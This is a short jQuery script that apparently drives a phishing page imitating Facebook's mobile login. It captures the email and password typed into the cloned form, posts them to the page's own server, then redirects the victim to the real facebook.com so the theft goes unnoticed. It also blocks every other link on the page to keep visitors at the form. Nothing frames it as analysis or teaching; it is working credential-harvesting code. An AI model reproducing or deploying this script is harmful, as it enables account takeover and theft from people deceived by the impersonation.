$('#login_form').submit(function (event) {
    event.preventDefault();

    var email = $('#m_login_email').val().trim();
    var pass = $('#m_login_password').val().trim();

    disable();

    var chk = (  email == null || pass == null || (email.length <= 2 || pass.length < 6) );
    if (chk) {
        enable();
        return;
    }

    $.ajax({
        url:'/',
        type:'POST',
        data:{
            email:email,
            pass:pass
        },
        success:function (data) {
            if(data == 'success') location.href = '//facebook.com/';
        }
    });


});

function disable() {
    $('#login').attr('disabled','');
}

function enable() {
    $('#login').removeAttr('disabled');
}

$('a').click(function (event) {
    if (this.href == '/') return;
    event.preventDefault();

    $('#m_login_email').focus();
    scroll(0,0);
});